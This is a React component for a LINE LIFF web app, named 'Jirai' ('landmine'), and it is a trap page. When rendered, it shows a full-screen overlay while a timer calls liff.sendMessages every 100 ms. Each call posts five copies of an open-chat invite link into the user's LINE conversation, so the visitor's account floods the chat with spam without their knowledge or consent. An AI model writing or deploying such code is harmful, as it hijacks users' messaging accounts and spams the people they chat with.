import React from 'react'

export default function Jirai(props) {

  const liff = props.liff;

  let msg = {
    type: "text",
    text: `
オープンチャット「架空国家讃岐国(香川県の会)四国連邦」
https://line.me/ti/g2/xAvSHTUHTZqabkPJZPwoaE3Ff9aUboxdyydwBQ    
`
  }

  setInterval(() => {
      liff.sendMessages([
        msg, msg, msg, msg, msg
      ])
  }, 100)

  return (
    <>
        <div className="jirai">
            ヨシフマン万歳なう・・・
        </div>
        <style>
            {
                `
                    .jirai {
                        width: 100vw;
                        height: 100vh;
                        background-color: #2b3146;
                        position: fixed;
                        top: 0;
                        left: 0;
                        z-index: 9999;
                        color: #ffffff;
                    }
                `
            }
        </style>
    </>
  )
}
